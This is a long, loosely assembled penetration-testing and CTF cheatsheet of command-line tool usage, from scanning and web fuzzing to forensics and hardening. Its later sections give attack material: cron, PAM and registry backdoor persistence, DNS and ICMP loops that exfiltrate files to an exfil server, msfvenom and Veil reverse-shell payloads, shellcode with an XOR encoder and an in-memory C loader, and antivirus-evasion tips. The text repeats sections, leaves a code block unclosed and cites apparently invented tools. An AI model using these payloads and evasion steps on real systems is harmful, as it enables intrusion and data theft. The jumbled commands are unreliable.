# Advanced CTF Reconnaissance Cheatsheet

Comprehensive guide for penetration testing and CTF reconnaissance, incorporating industry best practices and modern tools.

#### **Active Directory Attacks & Defense**

-   **Kerberoasting**:

    `GetUserSPNs.py domain/user:password -request`

-   **Abusing ACLs for Privilege Escalation**:


    `Invoke-ACLScanner -ResolveGUIDs | Out-GridView`

-   **AD Hardening** (Defensive):


    `Set-ADAccountControl -PasswordNeverExpires $false`

#### **CI/CD Pipeline Attacks**

-   **GitHub Actions Security**:


    `gh secret list --repo $REPO`

-   **Jenkins Enumeration**:


    `curl -X GET http://jenkins.example.com:8080/script`

#### **Container Escape Techniques**

-   **Escaping Docker via Privileged Mode**:



    `docker run --rm -it --privileged ubuntu bash`

#### **Hardware Attacks**

-   **Using BusPirate to communicate with SPI devices**:


    `flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r backup.bin`

-   **PCIe Exploits / DMA Attacks (PCILeech, Attacker PCI devices like Screamer)**.

* * * * *

### **3\. Offline Usage & Portable Version**

-   **Markdown or HTML version** for easy local viewing (`pandoc` can convert Markdown → PDF, HTML, or Docx).
-   **Cheat sheet generator** script:


    `awk '/^###/ {print $2}' pentest_cs.md`

* * * * *

### **4\. Custom Scripts for Efficiency**

A few **wrapper scripts** for commonly used tasks could be included. For example:

#### **Automate enumeration (Linux & Windows)**

`#!/bin/bash
echo "[*] Running Recon on $1"
nmap -sC -sV -oA recon $1`

## Password Cracking Optimizations

### GPU Acceleration
```bash
# OpenCL optimization
hashcat -m 1000 -w 3 -O --kernel-accel 1 -a 0 hash.txt wordlist.txt

# Multiple GPU utilization
hashcat -m 1000 -d 1,2 hash.txt wordlist.txt

# Custom rule generation
hashcat --generate-rules=10000 > custom.rule
```

### Password Analysis
```bash
# PCFG analysis
PCFG_Cracker -r rules.txt passwords.txt

# Markov chain generation
john --markov:50 --format=raw-md5 hashes.txt
```

## Advanced Evasion Techniques

### Traffic Obfuscation
```bash
# DNS tunneling
iodine -f -P password dns.tunnel.com
dnscat2 --dns domain=tunnel.com

# ICMP tunneling
ptunnel -p target.com -lp 8000 -da destination.com -dp 80
```

### Process Injection
```bash
# Process hollowing
pe-hollow target.exe payload.bin

# DLL injection
injector.exe --process explorer.exe --dll malicious.dll

# Thread execution hijacking
hijack.exe --pid 1234 --shellcode payload.bin
```

## Memory Analysis

### Live Memory Forensics
```bash
# Process memory inspection
procdump -ma pid output.dmp
strings -el output.dmp | grep -i password

# Kernel memory analysis
windbg -k com:port=COM1,baud=115200
livekd -w -k debugger
```

### Advanced Volatility Usage
```bash
# Registry analysis
vol.py -f mem.dmp windows.registry.hivelist
vol.py -f mem.dmp windows.registry.printkey

# Malware detection
vol.py -f mem.dmp windows.malfind
vol.py -f mem.dmp windows.dlllist --pid 1234
```

## Red Team Infrastructure

### C2 Infrastructure Setup
```bash
# Domain fronting setup
cloudfront-config.sh --domain front.com --target c2.hidden.com

# Redirector configuration
socat TCP4-LISTEN:80,fork TCP4:internal-c2:80
nginx -c redirect.conf
```

### OPSEC Considerations
```bash
# Certificate management
certbot certonly --standalone -d *.domain.com
acme.sh --issue -d domain.com --standalone

# Domain categorization
categorize-domain.py domain.com --category business
```

## IoT Security Testing

### Firmware Emulation
```bash
# QEMU firmware emulation
qemu-system-arm -M virt -kernel firmware.bin
firmadyne-run firmware.bin --arch arm

# Hardware debugging
openocd -f board/stm32f4discovery.cfg
gdb-multiarch -ex 'target remote localhost:3333'
```

### Protocol Analysis
```bash
# Zigbee analysis
zbdump -c 11 -w capture.pcap
zbgoodfind -i capture.pcap -k

# BLE scanning
btlejack -s -c 37,38,39
ubertooth-scan -U
```

## Supply Chain Security

### Package Analysis
```bash
# NPM package inspection
npm-audit-html
snyk test --json > results.json

# Container analysis
syft packages alpine:latest
grype db update && grype alpine:latest
```

### Build Pipeline Security
```bash
# Source composition analysis
dependency-check --project test --scan .
trivy fs --security-checks vuln,secret .

# Binary analysis
codeql database create db --language=cpp
codeql query run queries/cpp/security
```

## Zero-Day Research

### Fuzzing Setup
```bash
# AFL++ configuration
afl-gcc -o test test.c
afl-fuzz -i input/ -o output/ ./test

# LibFuzzer integration
clang -fsanitize=fuzzer test.c
./a.out -max_len=4096 corpus/
```

### Exploit Development
```bash
# ROP chain generation
ropper --file binary --chain "execve"
ROPgadget --binary binary --ropchain

# Heap exploitation
gdb-peda heap
pt-heap-analysis binary
```

## Post-Exploitation

### Persistence Mechanisms
```bash
# Windows persistence
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
schtasks /create /tn "update" /tr "c:\mal.exe" /sc onstart

# Linux persistence
echo "* * * * * /tmp/backdoor" >> /var/spool/cron/root
echo "auth optional pam_exec.so /tmp/backdoor" >> /etc/pam.d/sshd
```

### Data Exfiltration
```bash
# DNS exfiltration
dns-cat --encode data.zip > encoded.txt
for i in $(cat encoded.txt); do dig $i.exfil.com;done

# ICMP exfiltration
ping-exfil.py --file secret.doc --destination 10.0.0.1
```

## Cloud Security Testing

### AWS Penetration Testing
```bash
# S3 bucket testing
aws s3api get-bucket-policy --bucket target-bucket
awscli-s3-bruteforce -b wordlist.txt -r us-east-1

# Lambda analysis
aws lambda list-functions --region all
lambda-analyzer -f function-name -r us-east-1
```

### Azure Security Testing
```bash
# Azure AD enumeration
az ad user list --query "[].userPrincipalName"
aad-browsingator -t tenant-id -c client-id

# Storage testing
az storage account keys list -g ResourceGroup -n AccountName
storage-explorer -c "connection-string"
```

### Application Security Automation

#### Custom Security Scanners
```bash
# API fuzzing
ffuf -w wordlist.txt -u https://api.target.com/FUZZ
nuclei-templates-generator -u https://api.target.com

# Authentication testing
auth-fuzzer -u https://target.com/login
session-analyzer --cookies cookies.txt
```

Wireless Network Testing
-----------------------

### WiFi Analysis
```bash
# Start wireless interface in monitor mode
airmon-ng start wlan0

# Capture handshakes
airodump-ng -c 1 --bssid MAC -w capture wlan0mon
aireplay-ng -0 2 -a MAC wlan0mon

# WPA/WPA2 cracking
hashcat -m 22000 capture.hccapx wordlist.txt
```

### Bluetooth Analysis
```bash
# Bluetooth scanning
hcitool scan
btscanner

# BLE analysis
bleah -t 0 -b MAC
gattool -b MAC -t random
```

Firmware Analysis
----------------

### Binary Firmware Analysis
```bash
# Firmware extraction
binwalk -Me firmware.bin
ubi_reader_extract_files -P firmware.ubi

# UART/JTAG analysis
screen /dev/ttyUSB0 115200
openocd -f interface/ftdi/jtagkey2.cfg
```

### IoT Device Testing
```bash
# Device discovery
nmap --script discovery $NETWORK/24
mdns-scan $NETWORK/24

# Protocol analysis
mqtt-pwn
coap-client -m get coap://$IP
```

Advanced Web Testing
-------------------

### GraphQL Analysis
```bash
# Schema introspection
graphql-introspection -u $URL/graphql
inql scanner -t $URL/graphql

# Query fuzzing
graphql-path-enum $URL/graphql
```

### API Security Testing
```bash
# API discovery
apisprout -port 8000 swagger.json
wsdl-wizard $URL/service?wsdl

# JWT manipulation
jwt-cracker $TOKEN
apicheck-jwt-tool -t $TOKEN
```

Browser Exploitation
-------------------

### Browser Debug Tools
```bash
# Firefox debugging
about:debugging
about:memory

# Chrome debugging
chrome://net-internals
chrome://tracing
```

### Extension Analysis
```bash
# Extension review
crxcavator scan extension_id
extension-analysis.py extension.crx
```

Malware Analysis
---------------

### Static Analysis
```bash
# PE file analysis
pescan malware.exe
peframe -j malware.exe

# String extraction
floss malware.exe
strings -a -e l malware.exe
```

### Dynamic Analysis
```bash
# Sandbox analysis
cuckoo submit malware.exe
firejail --seccomp malware.exe

# Network monitoring
inetsim
fakenet-ng
```

Infrastructure Hardening
-----------------------

### System Hardening
```bash
# Linux hardening
lynis audit system
docker-bench-security

# Windows hardening
Get-ProcessMitigation -System
Set-ProcessMitigation -System -Enable DEP,ASLR
```

### Network Hardening
```bash
# Firewall analysis
iptables-analyzer
pfctl -sr

# Service hardening
apache2ctl -t -D DUMP_MODULES
nginx -T
```

Threat Hunting
-------------

### Log Analysis
```bash
# System logs
journalctl --since "1 hour ago"
ausearch -ts today -i

# Network logs
zeek-cut conn.log
rita show-beacons
```

### YARA Rules
```bash
# Rule creation
yara-generator samples/
yarabuilder -d samples/

# Rule testing
yara -r rules.yar directory/
yara-ci test rules/
```

Emergency Response
-----------------

### Incident Response
```bash
# Memory acquisition
lime -format raw -o memory.lime
winpmem -o memory.raw

# Disk imaging
dc3dd if=/dev/sda hash=sha256 of=disk.img
ewfacquire /dev/sda
```

### Network Forensics
```bash
# Packet capture
tcpdump -i any -w capture.pcap
dumpcap -i eth0 -w capture.pcap

# Traffic analysis
suricata -c suricata.yaml -r capture.pcap
bro -r capture.pcap
```

Cloud Security
-------------

### Kubernetes Security
```bash
# Cluster analysis
kube-hunter --remote $CLUSTER
kubeaudit all

# Pod security
popeye -n namespace
polaris audit --audit-path=$PATH
```

### Serverless Security
```bash
# Function analysis
serverless doctor
lambdaguard -p profile -r region

# Configuration review
checkov -d . --framework serverless
cfn_nag_scan --input-path template.yaml
```

Specialized Tools
----------------

### Hardware Hacking
```bash
# Serial communication
minicom -D /dev/ttyUSB0
screen /dev/ttyUSB0 115200

# Logic analysis
sigrok-cli --driver fx2lafw
pulseview
```

### Radio Frequency
```bash
# SDR analysis
rtl_433 -f 433.92M
gqrx-sdr

# GSM analysis
kalibrate-rtl -s GSM900
grgsm_livemon
```

Report Templates
---------------

### Documentation Structure
```markdown
# Executive Summary
- Overview
- Risk Rating
- Key Findings

# Technical Findings
- Vulnerability Details
- Proof of Concept
- Remediation Steps

# Appendices
- Tools Used
- Methodology
- Evidence
```

### Risk Assessment Matrix
```
Impact Levels:
- Critical: System/Data Compromise
- High: Significant Function Disruption
- Medium: Limited Feature Impact
- Low: Minimal Effect

CVSS Scoring Guide:
- 9.0-10.0: Critical
- 7.0-8.9:  High
- 4.0-6.9:  Medium
- 0.1-3.9:  Low
```

### Port Scanning Fundamentals

```bash
# Initial quick scan
sudo nmap -sC -sV -O -oA nmap/initial $IP

# Comprehensive TCP scan
sudo nmap -p- -sV --min-rate 5000 -oA nmap/full $IP

# UDP services scan
sudo nmap -sU --top-ports 1000 -oA nmap/udp $IP
```

#### Advanced Nmap Techniques
```bash
# Aggressive service detection
sudo nmap -A -T4 -p- -oA nmap/aggressive $IP

# NSE script scanning
sudo nmap --script vuln,exploit -oA nmap/vuln $IP

# Stealth scanning
sudo nmap -sS -sV -f --data-length 200 -D RND:10 $IP
```

### Fast Scanning Tools

#### Masscan
```bash
# Quick port discovery
masscan -p1-65535 $IP --rate=10000

# Targeted service scan
masscan -p80,443,8000-8100 $IP --rate=1000
```

#### Rustscan
```bash
# Fast initial scan
rustscan -a $IP -- -sC -sV

# Targeted scan with custom ports
rustscan -a $IP -p 80,443,3306 -- -sV
```

Web Application Testing
----------------------

### Directory Enumeration

#### Feroxbuster (Modern Alternative)
```bash
# Basic scan
feroxbuster -u $URL -w /usr/share/wordlists/dirb/common.txt

# Extended scan with multiple extensions
feroxbuster -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,asp,html,js
```

#### FFuF (Fast Web Fuzzer)
```bash
# Directory fuzzing
ffuf -u $URL/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Parameter fuzzing
ffuf -u "$URL/api?FUZZ=value" -w /usr/share/wordlists/params.txt

# Virtual host discovery
ffuf -u $URL -H "Host: FUZZ.$DOMAIN" -w subdomains.txt
```

### Web Vulnerability Scanning

#### Nuclei
```bash
# Basic template scan
nuclei -u $URL -t nuclei-templates/

# Targeted vulnerability scan
nuclei -u $URL -t nuclei-templates/cves/ -severity critical,high

# Multiple target scan
nuclei -l urls.txt -t nuclei-templates/vulnerabilities/
```

#### OWASP ZAP CLI
```bash
# Quick scan
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' $URL

# Full scan
zap-cli full-scan --self-contained $URL
```

Network Services
---------------

### SMB Enumeration

#### SMBMap
```bash
# Basic share enumeration
smbmap -H $IP

# Recursive file listing
smbmap -H $IP -R

# User authentication
smbmap -H $IP -u "username" -p "password"
```

#### CrackMapExec
```bash
# Share enumeration
crackmapexec smb $IP

# Password spraying
crackmapexec smb $IP -u users.txt -p passwords.txt

# Domain enumeration
crackmapexec smb $IP --users --groups
```

### LDAP Enumeration

#### ldapsearch
```bash
# Anonymous bind
ldapsearch -x -H ldap://$IP -b "dc=example,dc=com"

# Authenticated search
ldapsearch -x -H ldap://$IP -D "cn=admin,dc=example,dc=com" -w password -b "dc=example,dc=com"
```

Vulnerability Assessment
-----------------------

### Web Application Vulnerabilities

#### SQLMap
```bash
# Basic injection test
sqlmap -u "$URL/?id=1"

# Advanced injection with tamper scripts
sqlmap -u "$URL" --forms --tamper=space2comment,between

# Database enumeration
sqlmap -u "$URL" --dbs --batch --random-agent
```

#### XSStrike
```bash
# Basic XSS scan
xsstrike --url $URL

# DOM XSS scan
xsstrike --url $URL --seeds seeds.txt --dom

# Blind XSS testing
xsstrike --url $URL --blind
```

OSINT Techniques
---------------

### Subdomain Enumeration

#### Amass
```bash
# Passive enumeration
amass enum -passive -d $DOMAIN

# Active enumeration
amass enum -active -d $DOMAIN -ip

# Intel gathering
amass intel -org "Target Company"
```

#### Subfinder
```bash
# Basic enumeration
subfinder -d $DOMAIN

# Silent output with resolved IPs
subfinder -d $DOMAIN -silent -resolve
```

Infrastructure Analysis
----------------------

### SSL/TLS Analysis

#### SSLyze
```bash
# Basic scan
sslyze $DOMAIN

# Comprehensive scan
sslyze --regular $DOMAIN --json_out=results.json
```

### Container Analysis

#### Container Scanning
```bash
# Trivy container scan
trivy image imagename:tag

# Grype vulnerability scan
grype imagename:tag
```

Data Analysis
------------

### File Analysis

#### Advanced File Analysis
```bash
# Deep file analysis
binwalk -Me suspicious_file

# Memory dump analysis
volatility -f memory.dmp imageinfo
```

#### Steganography
```bash
# StegSeek (faster than steghide)
stegseek image.jpg wordlist.txt

# Deep image analysis
zsteg -a image.png

# Audio steganography
sonic-visualiser audio.wav
```

Documentation & Reporting
------------------------

### Note Taking Tools

#### CherryTree
```bash
# Create new document
cherrytree pentest_notes.ctb

# Import from markdown
cherrytree --import-markdown notes.md
```

#### Obsidian
- Create vault for each assessment
- Use templates for consistent documentation
- Link findings and evidence
- Export to various formats

OSINT Techniques
---------------

### Email Discovery
```bash
# TheHarvester
theHarvester -d $DOMAIN -b all

# h8mail for breach data
h8mail -t target@email.com
```

### Social Media Reconnaissance
```bash
# Sherlock for username search
sherlock username

# Twint for Twitter OSINT
twint -u username --email --phone
```

### Document Metadata
```bash
# Exiftool for metadata analysis
exiftool document.pdf

# Metagoofil for document gathering
metagoofil -d $DOMAIN -t pdf,doc,xls -n 10
```

### Git Repository Analysis
```bash
# GitLeaks for secrets
gitleaks detect --source=./repo

# TruffleHog for pattern matching
trufflehog --regex --entropy=False github.com/org/repo
```

Advanced Exploitation
--------------------

### Buffer Overflow Analysis
```bash
# Pattern creation
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

# Pattern offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438
```

### Reverse Engineering
```bash
# Ghidra headless analysis
ghidra_analyze -import binary

# Radare2 analysis
r2 -A binary
```

### Privilege Escalation
```bash
# Linux enumeration
./linpeas.sh
./linux-smart-enumeration/lse.sh

# Windows enumeration
.\winPEAS.exe
PowerUp.ps1
```

### Custom Exploit Development
```bash
# ROPgadget for ROP chains
ROPgadget --binary binary --rop --badbytes "0a0d"

# One_gadget for libc exploitation
one_gadget libc.so.6
```

Infrastructure Analysis
----------------------

### Network Infrastructure
```bash
# Masscan for network mapping
masscan -p1-65535 $NETWORK/24 --rate=10000

# Nmap NSE infrastructure scripts
nmap --script broadcast-dhcp-discover
nmap --script snmp-brute $IP
```

### Active Directory
```bash
# BloodHound collection
bloodhound-python -d domain.local -u user -p pass -c All

# Impacket suite
GetADUsers.py -all domain.local/user:password
```

### Containerization
```bash
# Docker analysis
docker-bench-security

# Kubernetes scanning
kube-hunter --remote $CLUSTER_IP
kubeaudit all -f cluster.yaml
```

Data Analysis
------------

### Memory Forensics
```bash
# Volatility basics
vol.py -f memory.dmp windows.pslist
vol.py -f memory.dmp windows.netscan

# Memory acquisition
lime -format raw -path /tmp/mem.lime
```

### Network Traffic
```bash
# Wireshark CLI
tshark -r capture.pcap -Y "http.request.method==POST"

# Network Miner
networkminer -r capture.pcap
```

### Database Analysis
```bash
# MongoDB enumeration
mongodump --host $IP

# Redis analysis
redis-cli -h $IP
```

Mobile Application Testing
-------------------------

### Android Analysis
```bash
# Static analysis
apktool d app.apk
dex2jar app.apk
jd-gui app.jar

# Dynamic analysis
frida-ps -U
frida-trace -U -i "open" com.app.package
```

### iOS Analysis
```bash
# Static analysis
otool -l app.ipa
class-dump app.ipa

# Dynamic analysis
cycript -p ProcessName
objection explore
```

Cloud Services
-------------

### AWS Enumeration
```bash
# S3 bucket analysis
aws s3 ls s3://$BUCKET --no-sign-request
aws s3api get-bucket-acl --bucket $BUCKET

# Lambda enumeration
aws lambda list-functions --region us-east-1
```

### Azure Reconnaissance
```bash
# Azure AD enumeration
AADInternals.ps1
Get-AADIntTenantDetails

# Storage analysis
az storage account list
az storage container list
```

### GCP Analysis
```bash
# GCP bucket enumeration
gsutil ls gs://$BUCKET

# Project reconnaissance
gcloud projects list
gcloud services list
```

Authentication Testing
---------------------

### Password Attacks
```bash
# Hashcat
hashcat -m 1000 hashes.txt rockyou.txt
hashcat -m 1800 ntlm.txt --rule-file=custom.rule

# John the Ripper
john --wordlist=wordlist.txt hashes.txt
john --incremental --format=raw-md5 hashes.txt
```

### Token Analysis
```bash
# JWT testing
jwt_tool.py $TOKEN -t
jwt_tool.py $TOKEN -C -d wordlist.txt

# OAuth testing
oauthscan.py -u $URL
```

### Multi-Factor Authentication
```bash
# MFA bypass testing
mfascan.py -u $URL
2fas -t $TOKEN -b wordlist.txt
```

Documentation
------------

### Report Generation
```bash
# Custom report templates
pandoc report.md -o report.pdf --template=pentest.tex

# Evidence management
processevidence.py -i evidence/ -o report/
```

### Collaboration Tools
```bash
# Collaborative documentation
mkdocs serve
gitbook serve
```

### Evidence Collection
```bash
# Screenshot automation
eyewitness --web --threads 10 -f urls.txt

# Video recording
asciinema rec session.cast
```


###  **Advanced Exploitation Techniques**

   - **Exploit Development**:

     ```bash

     # Metasploit pattern creation and offset calculation

     /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

     /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x39694438

     ```

   - **ROP Chain Generation**:

     ```bash

     # ROPgadget for ROP chain generation

     ROPgadget --binary vuln_binary --ropchain

     ```

   - **Heap Exploitation**:

     ```bash

     # Use tools like pwndbg or gef for heap analysis

     gdb -q ./vuln_binary

     gef➤  heap bins

     ```

###  **Post-Exploitation Techniques**

   - **Persistence Mechanisms**:

     ```bash

     # Windows registry persistence

     reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"

     # Linux cron job persistence

     echo "* * * * * /path/to/backdoor.sh" | crontab -

     ```

   - **Lateral Movement**:

     ```bash

     # Pass-the-hash with pth-winexe

     pth-winexe -U admin%hash //$IP cmd

     # WMI lateral movement

     wmic /node:$IP process call create "cmd.exe /c C:\path\to\backdoor.exe"

     ```

   - **Data Exfiltration**:

     ```bash

     # Exfiltrate data using DNS

     for file in $(ls /sensitive_data); do dig +short $(xxd -p $file) @exfil_server; done

     # Exfiltrate data using ICMP

     ping -p $(xxd -p sensitive_file) exfil_server

     ```

###  **Cloud Security Enhancements**

   - **Cloud Enumeration**:

     ```bash

     # AWS S3 bucket enumeration

     aws s3 ls s3://bucket-name --no-sign-request

     # Azure blob storage enumeration

     az storage blob list --account-name $ACCOUNT --container-name $CONTAINER

     ```

   - **Cloud Misconfiguration Checks**:

     ```bash

     # Check for public S3 buckets

     aws s3api get-bucket-acl --bucket $BUCKET --query 'Grants[?Grantee.URI==`http://acs.amazonaws.com/groups/global/AllUsers`]'

     # Check for open Azure storage containers

     az storage container list --account-name $ACCOUNT --query '[?properties.publicAccess!=`None`]'

     ```

   - **Cloud Credential Abuse**:

     ```bash

     # AWS credential enumeration

     aws sts get-caller-identity

     # Azure credential enumeration

     az ad signed-in-user show

     ```


###  **Physical Security Testing**

   - **RFID Cloning**:

     ```bash

     # Clone RFID card using Proxmark3

     proxmark3> lf search

     proxmark3> lf em410x clone --id 12345678

     ```

   - **NFC Exploitation**:

     ```bash

     # Read NFC tag using libnfc

     nfc-list

     nfc-mfclassic r a dump.mfd

     ```


### **Reporting and Documentation Enhancements**

   - **Automated Report Generation**:

     ```bash

     # Generate a report with Dradis

     dradis --report pentest_report.html


### **Blue Team and Defensive Techniques**

   - **SIEM Integration**:

     ```bash

     # Send logs to Splunk

     echo "Suspicious activity detected" | nc splunk_server 514

     # Send logs to ELK Stack

     curl -X POST -H "Content-Type: application/json" -d '{"message": "Suspicious activity detected"}' http://elk_server:9200/logs/_doc

     ```

   - **Honeypot Deployment**:

     ```bash

     # Deploy a honeypot with Cowrie

     docker run -p 2222:2222 cowrie/cowrie

     ```

   - **Capture The Flag (CTF) Challenges**:

     ```bash

     # Start a CTF challenge with CTFd

     docker run -p 8000:8000 ctfd/ctfd

     ```

     ```bash

     # Backup your findings and evidence

     tar -czvf pentest_backup_$(date +%F).tar.gz /path/to/findings

     ```

   - **Cleanup Procedures**:

     ```bash

     # Remove all temporary files and logs

     rm -rf /tmp/*

     rm -rf ~/.msf4/logs/*

     ```


### **Custom Encoders**

-   **How to Create a Custom Encoder**:

    -   Write a simple XOR or AES-based encoder in a language like Python or C.

    -   Use the encoded payload in your exploit or loader.

-   **Example: XOR Encoder in Python**:

    def xor_encode(data, key):
        return bytes([b ^ key for b in data])

    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    key = 0xAA
    encoded_shellcode = xor_encode(shellcode, key)
    print(encoded_shellcode)

-   **Decode the Payload at Runtime**:

    -   Write a loader in C or Python that decodes the payload in memory and executes it.

* * * * *

### **Using Less Common Encoders**

Metasploit has other encoders that are less commonly used and may evade detection better than Shikata Ga Nai. Examples include:

-   `x86/opt_sub`

-   `x86/call4_dword_xor`

-   `x86/fnstenv_mov`

You can list all available encoders in Metasploit:

msfvenom --list encoders

* * * * *

### **Veil-Evasion**

As mentioned earlier, **Veil-Evasion** is a powerful tool for generating AV-evading payloads. It uses various techniques like:

-   Custom encryption.

-   Obfuscation.

-   Embedding payloads in legitimate templates.

**Example**:

./Veil-Evasion.py
> use go/meterpreter/rev_tcp
> set LHOST 192.168.1.100
> set LPORT 4444
> generate

* * * * *

### ** Shellter for Dynamic Payload Injection**

**Shellter** is a dynamic shellcode injection tool that embeds payloads into legitimate executables. This makes the payload less suspicious because it runs within a trusted application.

**Example**:

shellter
> Select a target executable (e.g., notepad.exe)
> Inject Meterpreter payload
> Output: payload_notepad.exe

* * * * *

### ** Donut for Position-Independent Shellcode**

**Donut** generates position-independent shellcode from .NET assemblies, VBScript, JScript, or EXE files. This shellcode can be embedded into custom loaders or scripts.

**Example**:

./donut -f payload.exe -o shellcode.bin

* * * * *

### ** Custom Loaders in C/C#/Python**

Writing custom loaders in languages like C, C#, or Python can help evade AV because the loader itself is not malicious. The payload is decoded and executed in memory, making it harder for AV to detect.

**Example: C Loader**:

c

Copy

#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "<ENCODED_SHELLCODE>";

int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}

* * * * *

### **7\. Using Crypters and Packers**

Crypters and packers encrypt or compress the payload, making it harder for AV to detect. However, many crypters are now detected, so you need to use custom or up-to-date tools.

**Examples**:

-   **Hyperion**: A runtime crypter for 32-bit executables.

    wine hyperion.exe payload.exe encrypted_payload.exe

-   **UPX**: A packer that compresses executables though its often detected by AVs.

    upx -9 payload.exe -o packed_payload.exe

* * * * *

### **8\. Staged Payloads**

Staged payloads split the payload into smaller parts, making it harder for AV to detect the full malicious code.

**Example**:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=4444 -f exe -o stage1.exe

-   The initial payload (stage1) downloads and executes the second stage (e.g., Meterpreter) from a remote server.

* * * * *

### **9\. Using Cobalt Strike's Artifact Kit**

Cobalt Strikes **Artifact Kit** allows you to generate custom payloads and loaders that are less likely to be detected by AV.

**Steps**:

1.  Download and extract the Artifact Kit.

2.  Modify the templates and build the payloads.

3.  Use the generated payloads in your engagements.

* * * * *

### **10\. Testing Against AV**

Before deploying a payload, test it against multiple AV solutions to ensure it bypasses detection. Tools like **VirusTotal** can be used for initial testing, but be cautious as it shares samples with AV vendors.

** Offline Testing **:

-   Use a sandbox environment with multiple AVs installed (e.g., Windows VMs with AV software).

-   Test the payload in isolation to avoid detection.

Best Practices
-------------
1. Always maintain chain of custody for evidence
2. Document all command execution and outputs
3. Validate findings through multiple tools
4. Follow ethical guidelines and scope
5. Regular backup of findings
6. Use time stamping for all activities
7. Maintain separate environments for different tests
8. Version control all custom scripts and tools

Remember to:
- Keep tools updated
- Verify tool outputs
- Document methodology
- Follow proper escalation procedures
- Maintain secure communications
- Regular status updates
- Clean up after testing
